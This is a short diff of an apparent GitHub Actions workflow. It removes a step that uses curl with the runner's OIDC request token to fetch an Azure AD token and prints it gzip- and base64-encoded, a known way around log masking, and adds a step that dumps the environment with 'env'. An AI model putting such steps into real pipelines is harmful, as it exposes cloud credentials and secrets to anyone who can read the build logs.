@@ -15,4 +15,4 @@ jobs:
           fetch-depth: 0
       - run: echo Ahoj
       - run: |
-          curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | gzip | base64
+          env
